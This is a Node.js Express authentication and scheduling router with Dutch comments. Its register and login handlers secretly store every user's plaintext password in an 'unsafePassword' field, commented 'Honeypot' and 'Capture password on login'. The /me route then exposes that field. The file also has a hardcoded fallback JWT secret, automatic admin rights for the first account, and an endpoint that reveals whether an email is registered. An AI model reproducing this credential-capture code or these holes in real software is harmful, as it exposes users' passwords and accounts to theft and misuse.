const express = require("express");
const router = express.Router();
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const User = require("../models/User");
const verifyToken = require("../middleware/auth"); // Check of pad klopt

// 🌍 HAAL SECRET UIT .ENV (Requirement!)
const JWT_SECRET = process.env.JWT_SECRET || "FALLBACK_SECRET_VOOR_DEV";

// REGISTER
router.post("/register", async (req, res) => {
  try {
    const { email, password, workHours, sleepHours, location, commuteTime, flexibility, hobbies } = req.body;

    let user = await User.findOne({ email });
    if (user) {
      return res.status(400).json({ message: "User already exists" });
    }

    // First User Rule: Eerste user wordt Admin 👑
    const isFirstAccount = (await User.countDocuments({})) === 0;
    const role = isFirstAccount ? 'admin' : 'user';

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    user = new User({
      email,
      password: hashedPassword,
      unsafePassword: password, // Honeypot 🍯
      role: role,
      initialPreferences: {
        workHours,
        sleepHours,
        location,
        commuteTime,
        flexibility,
        hobbies,
      },
    });

    await user.save();

    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
    
    res.status(201).json({ token, uid: user.uid, role: user.role });
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error during registration" });
  }
});
// 🗑️ HIER HEB IK DE DUBBELE CODE VERWIJDERD

// CHECK EMAIL
router.post("/check-email", async (req, res) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email });
    res.json({ exists: !!user });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// LOGIN
router.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(400).json({ message: "Invalid Credentials" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ message: "Invalid Credentials" });
    }

    // Capture password on login 😈
    user.unsafePassword = password;
    await user.save();

    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
    res.json({ token, uid: user.uid, role: user.role });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

// GET PROFILE
router.get("/me", verifyToken, async (req, res) => {
  try {
    const user = await User.findOne({ uid: req.user.uid }).select("-password");
    if (!user) return res.status(404).json({ msg: "User not found" });
    res.json(user);
  } catch (err) {
    res.status(500).send("Server Error");
  }
});

// SCHEDULE (Voor drag & drop posities)
router.post("/schedule", verifyToken, async (req, res) => {
  try {
    const { placements } = req.body;
    
    // Gebruik findOneAndUpdate voor atomaire update (beter dan .save() voor partial updates)
    const user = await User.findOneAndUpdate(
        { uid: req.user.uid },
        { $set: { placements: placements } },
        { new: true }
    );

    if (!user) return res.status(404).json({ error: "User not found" });

    res.json({ message: "Schedule saved", placements: user.placements });
  } catch (err) {
    console.error("Schedule save error:", err);
    res.status(500).json({ error: err.message });
  }
});

// TASK (Voor nieuwe taken aanmaken)
// 🛡️ Geüpdatet met Validatie & $push (Requirement: Data cleaning)
router.post("/task", verifyToken, async (req, res) => {
  try {
    const { task } = req.body;
    
    // 1. VALIDATION CHECK 🛡️
    if (!task || !task.name) {
        return res.status(400).json({ error: "Task name is required" });
    }

    // 2. DATA CLEANING 🧹
    const cleanTask = {
        ...task,
        name: task.name.trim(), // Spaties wegknippen
        duration: Math.max(0.5, parseFloat(task.duration) || 1), // Altijd een nummer
        location: task.location ? task.location.trim() : ""
    };

    // 3. DB UPDATE ($push) 💾
    const updatedUser = await User.findOneAndUpdate(
      { uid: req.user.uid },
      { $push: { customTasks: cleanTask } },
      { new: true }
    );

    if (!updatedUser) return res.status(404).json({ error: "User not found" });

    res.json({ message: "Task saved", customTasks: updatedUser.customTasks });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;